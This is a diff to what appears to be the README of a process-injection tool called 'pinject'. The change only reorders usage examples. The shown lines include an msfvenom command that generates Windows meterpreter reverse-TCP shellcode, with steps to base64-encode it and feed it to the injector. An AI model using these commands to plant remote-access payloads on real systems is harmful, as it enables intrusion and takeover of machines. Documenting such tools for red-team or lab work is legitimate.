@@ -201,15 +201,15 @@ Generate shellcode with proper null byte avoidance and correct format:
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
 
-# Base64 encode it before sending to the module
+# Base64 encode it and save to file before sending to the module
+base64 -w 0 shellcode.bin > shellcode.b64 
+pinject shellcode.b64
+
+# Base64 encode it before sending to the module 
 base64 -w 0 shellcode.bin
 pinject <base64_shellcode>
 # Example:
 pinject 123ABCD==
-
-# Base64 encode it and save to file before sending to the module
-base64 -w 0 shellcode.bin > shellcode.b64
-pinject shellcode.b64
 ```
 
 #### Notes
